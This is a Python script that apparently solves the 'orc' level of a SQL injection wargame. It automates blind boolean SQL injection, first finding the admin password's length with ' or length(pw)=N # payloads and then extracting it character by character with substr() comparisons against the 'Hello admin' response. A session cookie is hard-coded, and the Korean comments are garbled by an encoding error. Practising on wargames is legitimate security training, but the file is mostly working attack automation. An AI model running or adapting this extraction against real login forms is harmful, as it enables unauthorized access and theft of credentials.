# -*- coding: cp949 -*-
import urllib.request
from urllib.parse import quote
#basic url ����
#query string �ۼ�
#query string ��� �� URL encoding
#request��û�� �߰�(User-Agent, Cookie)

#password�� ���� ������
result = "" 
pwlen = 0
'''
    [0] URL����
    [1] URL���� : ' or length(pw) = {} #
    [2] HTTP��ü�� URL Header ����(��Ű, ������)
    [3] URL �������� ��û
    [4] ���信 "Hello admin" ����Ȯ��
    [5] ���Ե� URL�� ���� ����/���
    '''
#�Ķ���� pw�� ���̸� ���ϱ� ���� �ݺ���
for i in range(1,10):
    #url default�� ����(���Ŀ� ���ϴ� QUERY������ ���� default����)
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
    #���� ���� ����(pw �÷��� ���� ���ϴ� ����)
    add_url = "' or length(pw)={} #".format(i)
    #URL encoding(��Ȱ�� get��û ȣȯ���� ����)
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("Cookie", "PHPSESSID=8al87atua9fclucfgn1vvuosb5")
    re.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
    response = urllib.request.urlopen(re)
    #print("1: {}, 2: {}".format(str(response.read()).find("Hello admin"), i))
    if str(response.read()).find("Hello admin") > 10:
        pwlen = i
        print("pw length : {}".format(pwlen))
        break
    '''
    [0] URL����
    [1] URL���� ' or substr(pw, X, 1) = X #
    [2] HTTP��ü�� URL Header ����(��Ű, ������)
    [3] URL �������� ��û
    [4] ���信 "Hello admin" ����Ȯ��
    [5] ���Ե� URL�� ���� ����/���(�ҹ���)
    '''
for i in range(1,pwlen+1):
    for j in range(ord('0'),ord('z')):
        #print(j)
        url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
        add_url = "' or id='admin' and substr(pw,1,{})='{}' #".format(str(i), result+chr(j))
        #print(add_url)
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)
        re.add_header("Cookie", "PHPSESSID=8al87atua9fclucfgn1vvuosb5")
        re.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin")> 10:
            result += chr(j).lower()
            print(result)
            break

print("Password : " + result)
